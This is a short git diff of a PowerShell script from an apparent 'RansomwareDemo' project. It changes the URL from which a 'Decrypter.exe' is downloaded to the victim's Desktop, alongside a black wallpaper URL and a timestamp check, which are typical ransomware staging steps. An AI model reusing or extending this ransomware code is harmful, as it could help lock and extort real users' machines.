@@ -6,7 +6,7 @@ $decrypterFolder = [System.Environment]::GetFolderPath('Desktop')
 $decrypterPath = Join-Path -Path $decrypterFolder -ChildPath "Decrypter.exe"
 
 $backgroundURL = "https://raw.githubusercontent.com/V4T3X/RansomwareDemo/refs/heads/main/res/black-solid-color-background.jpg"
-$decrypterURL = "https://raw.githubusercontent.com/V4T3X/RansomwareDemo/refs/heads/main/Decrypter.exe"
+$decrypterURL = "https://raw.githubusercontent.com/V4T3X/RansomwareDemo/refs/heads/main/Decrypter/Decrypter/bin/Debug/app.publish/Decrypter.exe"
 # ------------------------------
 
 If (-Not (Test-Path -path "$tempPath\timestamp.txt"))
